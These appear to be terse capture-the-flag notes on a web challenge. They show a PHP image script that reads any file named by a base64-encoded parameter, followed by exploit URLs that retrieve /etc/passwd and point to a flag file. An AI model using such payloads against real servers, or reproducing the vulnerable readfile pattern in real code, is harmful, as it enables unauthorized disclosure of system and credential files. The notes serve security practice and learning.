



'''
http://3.91.17.218/

getimg.php
http://3.91.17.218/getimg.php?img=Z2V0aW1nLnBocA==

```php
<?php
header("Content-Type: image/jpg");
readfile(base64_decode($_GET['img']));
?>
```

/etc/passwd
http://3.91.17.218/getimg.php?img=L2V0Yy9wYXNzd2Q=

/var/www/html/flag

'''